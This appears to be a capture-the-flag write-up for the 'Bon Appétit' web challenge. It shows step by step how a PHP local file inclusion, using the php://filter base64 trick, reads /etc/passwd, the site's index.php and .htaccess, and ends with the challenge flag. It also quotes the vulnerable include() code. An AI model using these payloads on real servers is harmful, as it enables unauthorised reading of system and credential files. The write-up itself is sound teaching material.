@@ -1,0 +1,57 @@
+Bon Appétit (100): Web 100
+
+Seeing the URL: http://bonappetit.stillhackinganyway.nl/?page=contact my first thought was it has to be a:
+
+Local File Inclusion: https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
+Trying to switch directories with ../ seemed to not work but switching to subdirectories e.g.: the image directory worked well. 
+
+The contact form gave me a hint, because the error said: "The requested URL /bat/MailHandler.php was not found on this server" so it seemed i have to look for .php files.
+
+Next i tried http://bonappetit.stillhackinganyway.nl/index.php which worked. So i was looking for php inclusion.
+
+I remembered the php base64 encode trick i used before and tried this:
+http://bonappetit.stillhackinganyway.nl/index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
+
+This way i was able to read the servesr passwd file. Sadly there is no flag here, so i gussed it has to be somewhere in the apache path.
+
+So i tried to get the index.php from the default ubuntu apache folder, this also worked:
+http://bonappetit.stillhackinganyway.nl/index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php
+
+<?php
+
+$page = empty($_GET["page"])? "home" : $_GET["page"]; 
+$page=str_replace("../", '', $page);
+$page=preg_replace(',^/,', '', $page);
+
+include($page);
+
+?>
+
+So this explains why "../" did not work... but still no flag!
+
+Searching for php file inclusion i found this blog:
+https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
+
+so i tried the apache access file ".htaccess" with: http://bonappetit.stillhackinganyway.nl/index.php?page=.htaccess
+
+<FilesMatch "\.(htaccess|htpasswd|sqlite|db)$">
+ Order Allow,Deny
+ Deny from all
+</FilesMatch>
+
+<FilesMatch "\.phps$">
+ Order Allow,Deny
+ Allow from all
+</FilesMatch>
+
+<FilesMatch "suP3r_S3kr1t_Fl4G">
+  Order Allow,Deny
+  Deny from all
+</FilesMatch>
+
+And there it is! There must be a file named suP3r_S3kr1t_Fl4G...
+
+http://bonappetit.stillhackinganyway.nl/index.php?page=suP3r_S3kr1t_Fl4G revealed:
+flag{82d8173445ea865974fc0569c5c7cf7f} 
+
+
